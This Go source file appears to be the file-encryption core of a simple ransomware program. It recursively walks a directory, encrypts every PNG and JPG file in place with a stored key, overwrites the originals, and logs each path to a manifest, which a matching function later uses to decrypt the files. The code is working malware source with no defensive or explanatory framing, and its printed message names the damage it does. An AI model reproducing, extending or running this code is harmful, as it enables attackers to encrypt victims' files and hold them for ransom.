package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var TargetExtensions = [...]string{
	"png",
	"jpg",
	"JPG",
}

func WalkPath(path string, rep *Repository) {
	mnf := rep.GetManifest()
	key := rep.GetDaKey()
	//defer mnf.Close()

	fmt.Printf("Shitting all over %s\n", path)
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		return
	}
	for _, f := range files {
		if f.IsDir() {
			WalkPath(filepath.Join(path, f.Name()), rep)
		} else {
			if IsTarget(f.Name()) {
				targetfile := filepath.Join(path, f.Name())
				filebytes, err := ioutil.ReadFile(targetfile)
				if err != nil {
					fmt.Println("Could not read: ", f.Name())
					continue
				}
				filebytes, err = encrypt(key, filebytes)
				if err != nil {
					fmt.Printf("Could not encrypt: %s\n", f.Name())
				} else {
					fmt.Printf("encrypted: %s\n", f.Name())
					_, err := mnf.WriteString(targetfile + "\n")
					if err != nil {
						fmt.Printf("Could not write into manifest!\n")
						panic(err)
					}
				}
				err = ioutil.WriteFile(targetfile, filebytes, 0666) //  TODO: same perms as original!!
				if err != nil {
					fmt.Println("Could not write encrypted file: %s\n", f.Name())
				}
			}
		}
	}
}

func IsTarget(path string) bool {
	for _, e := range TargetExtensions {
		if strings.HasSuffix(path, e) {
			return true
		}
	}
	return false
}

func DecryptAll(rep *Repository) {
	file := rep.GetManifest()
	defer file.Close()
	key := rep.GetDaKey()

	sc := bufio.NewScanner(file)
	for sc.Scan() {
		f := sc.Text()
		filebytes, err := ioutil.ReadFile(f)
		if err != nil {
			fmt.Println("Could not read: ", f)
			continue
		}
		filebytes, err = decrypt(key, filebytes)
		if err != nil {
			fmt.Printf("Could not decrypt: %s\n", f)
		} else {
			fmt.Printf("decrypted: %s\n", f)
		}
		err = ioutil.WriteFile(f, filebytes, 0666) //  TODO: same perms as original!! (os.Stat())
		if err != nil {
			fmt.Println("Could not write decrypted: %s\n", f)
		}
	}
	if err := sc.Err(); err != nil {
		fmt.Println("Errors came up when reading scanning manifest!")
		panic(err)
	} else {
		fmt.Printf("All done. Truncating manifest: %s\n", rep.ManifestPath)
		err := os.Truncate(rep.ManifestPath, 0)
		if err != nil {
			fmt.Println("Could not truncate manifest file.\n")
		}
	}

}
